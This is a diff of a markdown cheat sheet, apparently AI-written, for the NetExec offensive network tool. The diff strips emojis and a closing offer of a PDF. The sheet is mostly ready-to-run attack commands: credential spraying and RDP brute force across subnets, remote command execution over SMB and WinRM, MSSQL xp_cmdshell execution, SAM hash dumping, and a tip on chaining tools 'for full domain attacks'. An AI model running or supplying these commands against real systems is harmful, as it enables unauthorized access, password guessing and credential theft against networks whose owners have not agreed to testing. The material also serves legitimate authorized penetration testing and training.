@@ -2,14 +2,7 @@ Here’s a detailed and easy-to-understand **cheat sheet for `netexec`**—a pow
 
 ---
 
-# 🧠 **NetExec Cheat Sheet**
-
-✅ _Modern replacement for CrackMapExec (CME)_  
-🔧 Automates credential testing, command execution, and enumeration over protocols like SMB, RDP, WinRM, etc.
-
----
-
-## 📦 **Installation**
+## **Installation**
 
 ```bash
 pipx install git+https://github.com/Pennyw0rth/NetExec
@@ -19,7 +12,7 @@ pip install git+https://github.com/Pennyw0rth/NetExec
 
 ---
 
-## 🛠️ **Basic Syntax**
+##  **Basic Syntax**
 
 ```bash
 netexec <protocol> <target> [options]
@@ -37,7 +30,7 @@ netexec <protocol> <target> [options]
 
 ---
 
-## 🎯 **Target Formats**
+##  **Target Formats**
 
 ```bash
 netexec smb 192.168.1.10
@@ -47,7 +40,7 @@ netexec smb hosts.txt            # file with one IP/hostname per line
 
 ---
 
-## 🔐 **Authentication Options**
+##  **Authentication Options**
 
 ```bash
 -u USERNAME       # single username
@@ -58,7 +51,7 @@ netexec smb hosts.txt            # file with one IP/hostname per line
 --local-auth      # only use local accounts
 ```
 
-### 🧪 Example Credential Spraying
+###  Example Credential Spraying
 
 ```bash
 netexec smb 192.168.1.0/24 -u admin -P passwords.txt
@@ -67,7 +60,7 @@ netexec smb 192.168.1.0/24 -U users.txt -p Welcome123
 
 ---
 
-## 🔎 **Info Gathering (Enumeration)**
+##  **Info Gathering (Enumeration)**
 
 |Task|Command Example|
 |---|---|
@@ -85,7 +78,7 @@ netexec smb 192.168.1.100 -u admin -p pass123 --shares --hostname --users
 
 ---
 
-## 🧨 **Command Execution**
+##  **Command Execution**
 
 ```bash
 netexec smb 192.168.1.100 -u admin -p pass123 -x "whoami"
@@ -98,7 +91,7 @@ netexec smb 192.168.1.100 -u admin -p pass123 -x "whoami"
 
 ---
 
-## 🔄 **WinRM (PowerShell Remoting)**
+##  **WinRM (PowerShell Remoting)**
 
 ```bash
 netexec winrm 192.168.1.100 -u admin -p pass123 -x "ipconfig"
@@ -106,7 +99,7 @@ netexec winrm 192.168.1.100 -u admin -p pass123 -x "ipconfig"
 
 ---
 
-## 💻 **RDP Brute Force / Valid Login**
+##  **RDP Brute Force / Valid Login**
 
 ```bash
 netexec rdp 192.168.1.0/24 -u admin -P passwords.txt
@@ -114,7 +107,7 @@ netexec rdp 192.168.1.0/24 -u admin -P passwords.txt
 
 ---
 
-## 🧬 **LDAP & Active Directory**
+##  **LDAP & Active Directory**
 
 ```bash
 netexec ldap 192.168.1.10 -u user -p pass --users
@@ -129,7 +122,7 @@ netexec ldap 192.168.1.10 -u user -p pass --users
 
 ---
 
-## 🧠 **MSSQL**
+##  **MSSQL**
 
 ```bash
 netexec mssql 192.168.1.10 -u sa -p password123 --exec "xp_cmdshell 'dir'"
@@ -137,7 +130,7 @@ netexec mssql 192.168.1.10 -u sa -p password123 --exec "xp_cmdshell 'dir'"
 
 ---
 
-## 📁 **Using a Credentials File**
+##  **Using a Credentials File**
 
 ```bash
 netexec smb 192.168.1.0/24 -C creds.txt
@@ -146,7 +139,7 @@ netexec smb 192.168.1.0/24 -C creds.txt
 
 ---
 
-## 🚀 **Common Examples**
+## **Common Examples**
 
 ### Credential Spray with password list
 
@@ -174,7 +167,7 @@ netexec smb 192.168.1.10 -u admin -p pass --sam
 
 ---
 
-## ⚙️ **Tips**
+##  **Tips**
 
 - Use `--no-bruteforce` to skip login attempts if credentials fail once.
     
@@ -184,7 +177,3 @@ netexec smb 192.168.1.10 -u admin -p pass --sam
     
 - Combine with tools like `kerbrute`, `bloodhound`, `impacket`, etc. for full domain attacks.
     
-
----
-
-Would you like this cheat sheet as a downloadable PDF or markdown file too?
